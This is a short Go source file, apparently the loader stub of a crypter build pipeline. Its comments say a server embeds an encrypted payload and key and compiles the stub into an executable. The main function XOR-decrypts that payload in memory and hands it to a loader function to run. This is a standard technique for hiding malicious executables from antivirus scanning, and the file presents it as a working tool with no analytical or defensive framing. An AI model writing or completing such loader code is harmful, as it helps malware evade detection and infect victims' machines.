// crypt-loader: minimal loader stub generated by the build server.
// The server generates payload_gen.go with encrypted payload + key,
// then compiles this package as the final EXE.
// At runtime: XOR-decrypts the payload in memory, then executes it.
package main


func main() {
	payload := make([]byte, len(encPayload))
	for i, b := range encPayload {
		payload[i] = b ^ cryptKey[i%len(cryptKey)]
	}
	loadPayload(payload)
}
